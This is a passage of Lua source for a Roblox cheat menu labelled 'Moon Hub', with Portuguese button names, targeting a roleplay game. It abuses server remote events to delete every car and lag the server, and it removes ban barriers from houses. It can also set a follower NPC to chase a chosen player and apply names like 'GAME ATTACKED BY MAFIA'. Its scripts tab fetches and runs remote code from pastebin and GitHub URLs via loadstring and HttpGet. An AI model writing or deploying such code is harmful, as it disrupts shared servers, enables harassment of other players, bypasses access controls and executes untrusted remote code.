  Callback = function(v)
    loopAudio = v
    if v then
      task.spawn(function()
        while loopAudio do
          if selAudio then
            pcall(function() RS.RE:FindFirstChild("1Gu1nSound1s"):FireServer(WS, selAudio, 1) end)
            local s = Instance.new("Sound", char.HumanoidRootPart)
            s.SoundId = "rbxassetid://"..selAudio; s:Play()
          end
          task.wait(0.5)
        end
      end)
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 7 (teleport) — Teleportes extras
-- ═══════════════════════════════════════════════════════════════════════

tab7:AddSection({ "Teleportes Extras" })
local tpsLst = {
  {"Aos Bastidores", CFrame.new(192,4,272)},
  {"Ao Centro Urbano", CFrame.new(136,4,117)},
  {"À Área do Crime", CFrame.new(-119,-28,235)},
  {"À Casa Deserta", CFrame.new(986,4,63)},
  {"Ao Portal da Agência", CFrame.new(672,4,-296)},
  {"Ao Esconderijo", CFrame.new(505,-75,143)},
  {"À Escola", CFrame.new(-312,4,211)},
  {"Ao Café Brook", CFrame.new(161,8,52)},
  {"Ao Ponto Inicial", CFrame.new(-26,4,-23)},
  {"Ao Arco Principal", CFrame.new(-589,141,-59)},
  {"Ao Hospital", CFrame.new(-309,4,71)},
  {"À Base da Agência", CFrame.new(179,4,-464)},
  {"À Sala Oculta da Oficina", CFrame.new(0,4,-495)},
  {"À Sala Secreta 2", CFrame.new(-343,4,-613)},
  {"À Ilha Isolada", CFrame.new(-1925,23,127)},
  {"À Praça dos Hotéis", CFrame.new(182,4,150)},
  {"Ao Banco Principal", CFrame.new(2.28,4.65,254.58)},
  {"À Loja de Roupas", CFrame.new(-46.15,4.65,253.20)},
  {"À Clínica Dentária", CFrame.new(-53.58,22.15,265.61)},
  {"À Cafeteria", CFrame.new(-97.12,4.65,254.99)},
}
for _, tp in ipairs(tpsLst) do
  tab7:AddButton({
    Name = tp[1],
    Callback = function()
      local rp = char and char:FindFirstChild("HumanoidRootPart")
      if rp then rp.CFrame = tp[2] end
    end,
  })
end

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 9 (Car) — Funções extras
-- ═══════════════════════════════════════════════════════════════════════

tab9:AddSection({ "Remove / Bring All Cars" })
tab9:AddButton({
  Name = "Remover Todos os Carros",
  Callback = function()
    pcall(function() RS.RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles") end)
    notify("Carros", "Todos os carros removidos!")
  end,
})
tab9:AddButton({
  Name = "Bring All Cars",
  Callback = function()
    for _, v in next, WS.Vehicles:GetChildren() do
      pcall(function() v:SetPrimaryPartCFrame(char:GetPrimaryPartCFrame()) end)
    end
  end,
})

tab9:AddSection({ "Speed / Turbo / Drift" })
local spd, turbo = 50, 50
tab9:AddTextBox({ Name="Speed", PlaceholderText="50", Callback = function(v) spd = tonumber(v) or 50 end })
tab9:AddTextBox({ Name="Turbo", PlaceholderText="50", Callback = function(v) turbo = tonumber(v) or 50 end })
tab9:AddTextBox({
  Name = "Drift",
  PlaceholderText = "50",
  Callback = function(v)
    pcall(function() RS.RE:FindFirstChild("1Player1sCa1r"):FireServer("DriftingNumber", v) end)
  end,
})
tab9:AddButton({
  Name = "Aplicar Speed/Turbo",
  Callback = function()
    local car = WS.Vehicles:FindFirstChild(LP.Name.."Car")
    if car then
      local body = car:FindFirstChild("Body") and car.Body:FindFirstChild("VehicleSeat")
      if body then
        if body:FindFirstChild("TopSpeed") then body.TopSpeed.Value = spd end
        if body:FindFirstChild("Turbo") then body.Turbo.Value = turbo end
        notify("Carro","Speed/Turbo aplicados!")
      end
    else notify("Erro","Coloque um carro primeiro") end
  end,
})

tab9:AddSection({ "RGB / Horn" })
local carRGB, carRGBConn = false, nil
tab9:AddToggle({
  Name = "Car RGB",
  Default = false,
  Callback = function(v)
    carRGB = v
    if v then
      local cores = { Color3.new(1,0,0), Color3.new(0,1,0), Color3.new(0,0,1), Color3.new(1,1,0), Color3.new(1,0,1), Color3.new(0,1,1), Color3.new(0.5,0,0.5), Color3.new(1,0.5,0) }
      carRGBConn = task.spawn(function()
        local ev = RS:WaitForChild("RE"):WaitForChild("1Player1sCa1r")
        while carRGB do
          for _, c in ipairs(cores) do
            if not carRGB then break end
            pcall(function() ev:FireServer("PickingCarColor", c) end)
            task.wait(1)
          end
        end
      end)
    end
  end,
})
local hornOn = false
tab9:AddToggle({
  Name = "Spam Horn",
  Default = false,
  Callback = function(v)
    hornOn = v
    if v then
      task.spawn(function()
        local ev = RS:WaitForChild("RE"):WaitForChild("1Player1sCa1r")
        while hornOn do
          pcall(function() ev:FireServer("Horn") end)
          task.wait(0.1)
        end
      end)
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 10 (House) — Auto Unban / RGB
-- ═══════════════════════════════════════════════════════════════════════

tab10:AddSection({ "Auto Unban / RGB" })
local unbanOn = false
tab10:AddToggle({
  Name = "Auto Unban (BannedBlocks)",
  Default = false,
  Callback = function(v)
    unbanOn = v
    if v then
      task.spawn(function()
        while unbanOn do
          pcall(function()
            local lots = workspaceService:FindFirstChild("001_Lots")
            if lots then
              for _, v2 in pairs(lots:GetDescendants()) do
                if v2.Name:match("^BannedBlock%d+$") then v2:Destroy() end
              end
            end
          end)
          task.wait(1)
        end
      end)
    end
  end,
})

local houseRGB = false
tab10:AddToggle({
  Name = "Casa RGB",
  Default = false,
  Callback = function(v)
    houseRGB = v
    if v then
      task.spawn(function()
        local cores = { Color3.new(1,0,0), Color3.new(0,1,0), Color3.new(0,0,1), Color3.new(1,1,0), Color3.new(0,1,1), Color3.new(1,0,1) }
        while houseRGB do
          for _, c in ipairs(cores) do
            if not houseRGB then break end
            pcall(function() RS.RE:FindFirstChild("1Player1sHous1e"):FireServer("ColorPickHouse", c) end)
            task.wait(0.8)
          end
        end
      end)
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 13 (scripts) — Scripts Universais
-- ═══════════════════════════════════════════════════════════════════════

tab13:AddSection({ "Universal Scripts" })

local scriptsLst = {
  {"Rael Hub Brook", "https://rawscripts.net/raw/The-Mimic-Rael-Hub-20921"},
  {"Ghost Hub", "https://rawscripts.net/raw/Universal-Script-GhostHub-16534"},
  {"Infinite Yield - Cmd", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
  {"TP Tool", "https://raw.githubusercontent.com/err0r129/KptHadesBlair/main/Bao.lua"},
  {"Fly Gui v3", "https://scriptblox.com/raw/Universal-Script-Fly-v3-7412"},
  {"Nameless Admin - Cmd", "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"},
  {"Telekinesis", "https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md"},
  {"ShiftLock", "https://pastebin.com/raw/N2tiHgyv"},
}
for _, s in ipairs(scriptsLst) do
  tab13:AddButton({
    Name = s[1],
    Description = "Universal",
    Callback = function()
      pcall(function() loadstring(game:HttpGet(s[2]))() end)
    end,
  })
end

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ NOVAS ABAS EXTRAS
-- ═══════════════════════════════════════════════════════════════════════

local lagTab = window:MakeTab({ Title = "Lag Server", Icon = "bomb" })
local lagSt = { Lap = false, Phone = false, Bomb = false }

lagTab:AddSection({ "Lag Server" })
lagTab:AddToggle({
  Name = "LAG COMPUTADOR",
  Default = false,
  Callback = function(v)
    lagSt.Lap = v
    if v then
      local lap = WS:FindFirstChild("WorkspaceCom") and WS.WorkspaceCom:FindFirstChild("001_GiveTools") and WS.WorkspaceCom["001_GiveTools"]:FindFirstChild("Laptop")
      if not lap then notify("Erro","Laptop não encontrado"); return end
      task.spawn(function()
        while lagSt.Lap do
          local c = LP.Character; local h = c and c:FindFirstChild("HumanoidRootPart")
          if h then
            h.CFrame = lap.CFrame
            local cd = lap:FindFirstChildWhichIsA("ClickDetector"); if cd then fireclickdetector(cd) end
          end
          task.wait(0.0001)
        end
      end)
    end
  end,
})
lagTab:AddToggle({
  Name = "LAG CELULAR",
  Default = false,
  Callback = function(v)
    lagSt.Phone = v
    if v then
      local path = WS:FindFirstChild("WorkspaceCom")
      local phone = path and path:FindFirstChild("001_CommercialStores")
      phone = phone and phone:FindFirstChild("CommercialStorage1")
      phone = phone and phone:FindFirstChild("Store")
      phone = phone and phone:FindFirstChild("Tools")
      phone = phone and phone:FindFirstChild("Iphone")
      if not phone then notify("Erro","Iphone não encontrado"); return end
      task.spawn(function()
        while lagSt.Phone do
          local c = LP.Character; local h = c and c:FindFirstChild("HumanoidRootPart")
          if h then
            h.CFrame = phone.CFrame
            local cd = phone:FindFirstChildWhichIsA("ClickDetector"); if cd then fireclickdetector(cd) end
          end
          task.wait(0.01)
        end
      end)
    end
  end,
})
lagTab:AddToggle({
  Name = "LAG BOMBA",
  Default = false,
  Callback = function(v)
    lagSt.Bomb = v
    if v then
      local bomb = WS:FindFirstChild("WorkspaceCom") and WS.WorkspaceCom:FindFirstChild("001_CriminalWeapons") and WS.WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools") and WS.WorkspaceCom["001_CriminalWeapons"]["GiveTools"]:FindFirstChild("Bomb")
      if not bomb then notify("Erro","Bomba não encontrada"); return end
      task.spawn(function()
        while lagSt.Bomb do
          local c = LP.Character; local h = c and c:FindFirstChild("HumanoidRootPart")
          if h and bomb then
            h.CFrame = bomb.CFrame
            if bomb:FindFirstChild("ClickDetector") then fireclickdetector(bomb.ClickDetector) end
          end
          task.wait(0.00001)
        end
      end)
      task.spawn(function()
        while lagSt.Bomb do
          VIM:SendMouseButtonEvent(500,500,0,true,game,0); task.wait(1.5)
          VIM:SendMouseButtonEvent(500,500,0,false,game,0)
          pcall(function() RS:WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r"):FireServer("Bomb"..LP.Name) end)
          task.wait(1.5)
        end
      end)
    end
  end,
})

local shadTab = window:MakeTab({ Title = "Shaders", Icon = "sparkles" })
shadTab:AddSection({ "Shaders Client-Side" })
shadTab:AddButton({
  Name = "Aplicar Shaders 1",
  Callback = function()
    local Lighting = game:GetService("Lighting")
    local sky = Instance.new("Sky", Lighting)
    sky.SkyboxBk = "rbxassetid://159454299"; sky.SkyboxDn = "rbxassetid://159454296"
    sky.SkyboxFt = "rbxassetid://159454293"; sky.SkyboxLf = "rbxassetid://159454286"
    sky.SkyboxRt = "rbxassetid://159454300"; sky.SkyboxUp = "rbxassetid://159454304"
    local cc = Instance.new("ColorCorrectionEffect", Lighting)
    cc.Brightness = 0.03; cc.Contrast = 0.15; cc.Saturation = 0.05
    cc.TintColor = Color3.fromRGB(255,240,220)
    local bloom = Instance.new("BloomEffect", Lighting)
    bloom.Intensity = 0.8; bloom.Size = 56; bloom.Threshold = 0.9
    local sun = Instance.new("SunRaysEffect", Lighting)
    sun.Intensity = 0.05; sun.Spread = 0.8
    notify("Shaders", "Shaders 1 aplicados!")
  end,
})

local kidTab = window:MakeTab({ Title = "Criança", Icon = "baby" })
local kid = { perseguir = nil, conn = nil }
local kidDD = kidTab:AddDropdown({
  Name = "Selecionar Jogador para Perseguir",
  Options = plist(),
  Default = "",
  Callback = function(v) kid.perseguir = v end,
})
kidTab:AddButton({ Name = "Atualizar Lista", Callback = function() if kidDD then kidDD:Refresh(plist(), true) end end })
kidTab:AddButton({
  Name = "Enviar Criança",
  Callback = function()
    if not kid.perseguir then notify("Erro","Selecione um alvo"); return end
    pcall(function() RS.RE:FindFirstChild("1Bab1yFollo1w"):FireServer("CharacterFollowSpawnPlayer","BabyBoy") end)
    task.wait(0.3)
    local t = kid.perseguir
    if WS:FindFirstChild(t) and WS:FindFirstChild(LP.Name) then
      local fc = WS[LP.Name]:FindFirstChild("FollowCharacter")
      if fc then fc.Parent = WS[t] end
      if kid.conn then kid.conn:Disconnect() end
      kid.conn = R.Heartbeat:Connect(function()
        local tg = WS:FindFirstChild(t)
        local fc2 = tg and tg:FindFirstChild("FollowCharacter")
        local hrp = tg and tg:FindFirstChild("HumanoidRootPart")
        if fc2 and fc2:FindFirstChild("Torso") and fc2.Torso:FindFirstChild("BodyPosition") and hrp then
          fc2.Torso.BodyPosition.Position = hrp.Position - (hrp.CFrame.LookVector * 3)
          if fc2.Torso:FindFirstChild("BodyGyro") then fc2.Torso.BodyGyro.CFrame = hrp.CFrame end
        end
      end)
    end
  end,
})
kidTab:AddButton({
  Name = "Retornar Criança",
  Callback = function()
    if kid.conn then kid.conn:Disconnect(); kid.conn = nil end
    pcall(function() RS.RE:FindFirstChild("1Bab1yFollo1w"):FireServer("DeleteFollowCharacter") end)
  end,
})

local nomesTab = window:MakeTab({ Title = "Nomes RP", Icon = "paper" })
nomesTab:AddSection({ "Nomes RP" })
local nomesLst = {
  {"Anonymus", " Anonymus "}, {"PRO", " PRO "}, {"ERR0R_666", " ERR0R_666 "},
  {"DARKNE1SSS", " DARKNE1SSS "}, {"GHOST", " GHOST "}, {"JOKER", " JOKER "},
  {"ADMIN", " ADMIN "}, {"TUBERS93", " TUBERS 93 "}, {"CO0LKID", " CO0 LKID "},
  {"GAME ATTACKED BY MAFIA", " GAME ATTACKED BY MAFIA "},
  {"INC0MUN", " INC0MUN"}, {"BAD BOY", " BAD BOY "},
}
for _, n in ipairs(nomesLst) do
  nomesTab:AddButton({
    Name = "Nome: " .. n[1],
    Callback = function()
      pcall(function() RS.RE["1RPNam1eTex1t"]:FireServer("RolePlayName", n[2]) end)
    end,
  })
end

              notify("Moon Hub", "Recursos extras carregados!")
        end -- fecha o do
    end -- fecha o if true
end) -- fecha o task.spawn(function()